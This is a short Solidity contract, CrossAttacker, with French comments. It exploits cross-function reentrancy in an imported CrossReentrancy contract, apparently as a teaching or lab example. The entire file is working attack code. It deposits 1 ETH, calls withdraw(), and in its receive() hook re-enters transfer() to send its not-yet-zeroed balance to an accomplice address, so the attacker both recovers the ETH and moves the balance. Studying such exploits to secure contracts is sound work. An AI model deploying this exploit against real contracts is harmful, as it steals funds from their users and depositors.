// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./CrossReentrancy.sol";

/**
 * @title CrossAttacker
 * @notice Exploite la cross-function reentrancy :
 *         1. withdraw() envoie ETH → déclenche receive()
 *         2. receive() appelle transfer() vers accomplice
 *         3. balances[attacker] pas encore à 0 → transfer réussit
 *         4. balances[attacker] = 0 s'exécute — mais ETH déjà transféré
 *         Résultat : attaquant a reçu l'ETH ET transféré son solde
 */
contract CrossAttacker {
    CrossReentrancy public target;
    address public accomplice;
    bool private attacking;

    constructor(address _target, address _accomplice) {
        target  = CrossReentrancy(_target);
        accomplice = _accomplice;
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        target.deposit{value: 1 ether}();
        attacking = true;
        target.withdraw();
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            // Re-entre dans transfer() pendant que balances[this] = 1 ETH encore
            target.transfer(accomplice, target.balances(address(this)));
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}